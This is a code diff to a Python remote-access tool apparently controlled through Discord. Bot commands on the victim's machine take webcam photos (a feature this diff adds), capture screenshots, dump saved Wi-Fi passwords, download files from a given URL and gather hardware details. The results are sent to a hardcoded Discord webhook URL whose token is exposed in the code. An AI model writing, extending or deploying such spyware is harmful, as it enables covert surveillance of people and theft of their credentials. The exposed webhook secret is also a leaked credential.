@@ -7,13 +7,17 @@ import discord
 from discord_webhook import DiscordWebhook
 import wmi
 import requests
+import cv2
 
 from dotenv import load_dotenv
 load_dotenv()
 
 
 
-TOKEN = os.getenv("BOT_TOKEN")
+#TOKEN = os.getenv("BOT_TOKEN")
+TOKEN = ""
+WEBHOOK_URL = "https://discord.com/api/webhooks/1195633509755265055/PkPWgyJEy9nRZrxcWTMwR88AWjf6X9WoOzo1FC5kSevKrJtMWbOrsZDAA_qWCH79x0dF"
+
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -47,13 +51,53 @@ async def on_message(message):
         chunklength = 2000
         chunks = [out[i:i+chunklength ] for i in range(0, len(out), chunklength )]
         for chunk in chunks: 
-            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content=chunk)
+            webhook = DiscordWebhook(url=WEBHOOK_URL, content=chunk)
             response = webhook.execute()
         
         
         
         
+    
         
+    elif message.content.startswith('cam'):
+        # Open a connection to the webcam (0 is usually the default camera)
+        cap = cv2.VideoCapture(0)
+
+        # Check if the camera is opened successfully
+        if not cap.isOpened():
+            print("Error: Could not open camera.")
+            return
+
+        # Set the duration for capturing frames (in seconds)
+        capture_duration = 1
+
+        # Capture frames for the specified duration
+        start_time = time.time()
+        while (time.time() - start_time) < capture_duration:
+            ret, frame = cap.read()
+            if not ret:
+                print("Error: Failed to capture frame.")
+                break
+
+            # Display the frame (optional)
+            # cv2.imshow("Frame", frame)
+            # cv2.waitKey(1)
+
+        # Save the last captured frame as an image
+        cv2.imwrite("pic.jpg", frame)
+        print("Picture captured successfully as 'captured_picture.jpg'")
+
+        # Release the camera and close the OpenCV window (if displayed)
+        cap.release()
+        cv2.destroyAllWindows()
+        time_now = datetime.datetime.now()
+
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content="pic taken at " + str(time_now))
+        with open("./pic.jpg", "rb") as f:
+            webhook.add_file(file=f.read(), filename="pic.jpg")
+        response = webhook.execute()
+        #os.remove("./help.png")
+
         
         
         
@@ -76,7 +120,7 @@ async def on_message(message):
         time_now = datetime.datetime.now()
         myScreenshot = pyautogui.screenshot()
         myScreenshot.save("help.png")
-        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Screenshot taken at " + str(time_now))
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Screenshot taken at " + str(time_now))
         with open("./help.png", "rb") as f:
             webhook.add_file(file=f.read(), filename="help.png")
         response = webhook.execute()
@@ -119,7 +163,7 @@ async def on_message(message):
         out += f'{"-"*20}|{"-"*29}\n'
         for name, password in networks:
             out += '{:<20}| {:<}\n'.format(name, password)
-        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`"+ out + "`")
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content="`"+ out + "`")
         response = webhook.execute()
 
 
@@ -127,7 +171,7 @@ async def on_message(message):
     elif message.content.startswith('download'):
         command = message.content
         command = command.replace('download ', '')
-        webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="Downloading!")
+        webhook = DiscordWebhook(url=WEBHOOK_URL, content="Downloading!")
         response = webhook.execute()
     
         url = command
@@ -142,7 +186,7 @@ async def on_message(message):
             gpu = wmi.WMI().Win32_VideoController()[0].Name
             ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                         0].TotalVisibleMemorySize) / 1048576, 0)
-            webhook = DiscordWebhook(url=os.getenv("WEBHOOK_URL"), content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
+            webhook = DiscordWebhook(url=WEBHOOK_URL, content="`" + "CPU: " + str(cpu) + "\nGPU: " + str(gpu) + "\nRAM: " + str(ram) + "GB" + "`")
             response = webhook.execute()
         
 
